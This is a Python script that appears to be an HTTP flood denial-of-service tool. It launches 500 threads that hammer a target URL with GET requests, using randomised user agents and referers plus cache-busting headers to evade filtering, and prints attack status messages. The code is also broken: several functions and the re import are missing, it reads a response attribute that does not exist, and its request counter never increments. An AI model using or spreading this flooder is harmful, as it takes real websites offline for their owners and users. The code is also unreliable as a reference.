import urllib3
import sys
import threading
import random
import string
import time

#global params
url=''
host=''
request_counter=0
flag=0
safe=0

def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.choice(string.ascii_lowercase)
		out_str += a
	return(out_str)

def httpcall(url):
	http = urllib3.PoolManager()
	headers = {
		'User-Agent': random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
		'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
		'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36']),
		'Cache-Control': 'no-cache',
		'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
		'Referer': 'https://www.google.com/?q=' + buildblock(random.randint(5,10)),
		'Keep-Alive': random.randint(110,120),
		'Connection': 'keep-alive',
		'Host': host
	}
	response = http.request('GET', url, headers=headers)
	if response.status_code == 500:
		set_flag(1)
		print('ATTACK SEND 💥')
	return(response.status_code)

#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception as ex:
			pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous!=request_counter):
				print("%d Request SEND " % (request_counter))
				previous=request_counter
		if flag==2:
			print("\n ATTACK STOPED")

#execute 
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print("ATTACK STARTED ☄️")
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('(https?\://)?([^/]*)/?.*', url)
		host = m.group(2)
		for i in range(500):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start()
